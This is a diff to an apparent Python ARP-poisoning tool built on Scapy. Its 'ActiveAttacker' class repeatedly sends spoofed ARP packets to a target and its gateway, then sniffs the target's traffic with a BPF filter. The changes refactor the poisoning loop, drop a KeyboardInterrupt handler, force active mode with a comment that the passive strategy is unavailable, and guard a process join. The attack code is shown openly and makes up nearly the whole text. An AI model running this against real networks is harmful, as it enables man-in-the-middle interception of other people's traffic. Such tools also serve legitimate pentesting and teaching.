@@ -65,7 +65,7 @@ class Arper:
     def run(self):
         with Context():
             attacker = ActiveAttacker() if self.active else PassiveAttacker()
-            attacker = ActiveAttacker()
+            attacker = ActiveAttacker()    # passive strategy temporarily unavailable
             attacker.start(self)
 
             
@@ -98,23 +98,16 @@ class ActiveAttacker:
         while not event.wait(0):
             sys.stdout.write('.')
             sys.stdout.flush()
-            try:
-                sendp(poison_target)
-                sendp(poison_gateway)
-            except KeyboardInterrupt:
-                arper.sniff_process.kill()
-                self.restore(arper)
-                print('Aborted')
-                return
-            else:
-                sleep(arper.delay)
+            sendp(poison_target)
+            sendp(poison_gateway)
+            sleep(arper.delay)
         self.restore(arper)
 
     def sniff_and_store(self, arper: Arper):
         print(f'Sniffing {arper.count} packets')
         bpf_filter = f'host {arper.target} and not arp'
         signal.signal(signal.SIGINT, signal.SIG_DFL)
-        packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)
+        packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)    # The sniff function can handle KeyboardInterrupt
         if len(packets) == 0:
             print('Aborted')
         arper.poison_event.set()
@@ -162,7 +155,8 @@ class ActiveAttacker:
         except KeyboardInterrupt:
             arper.poison_event.set()
         finally:
-            arper.sniff_process.join()
+            if arper.sniff_process.is_alive():
+                arper.sniff_process.join()
             try:
                 poison_process.join()
             except:
